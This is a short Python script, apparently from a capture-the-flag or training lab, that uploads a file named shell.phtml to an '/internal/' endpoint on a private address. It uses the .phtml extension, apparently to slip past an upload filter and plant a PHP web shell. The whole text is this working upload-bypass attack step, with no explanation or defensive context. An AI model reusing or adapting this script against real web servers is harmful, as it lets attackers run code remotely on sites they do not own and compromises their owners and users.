import requests

url = 'http://10.10.152.33:3333/internal/'
s= requests.Session()
file={'file':open('shell.phtml', 'rb')}
r = s.post(url, files=file,data={'filename':'shell.phtml'})
print(r.text)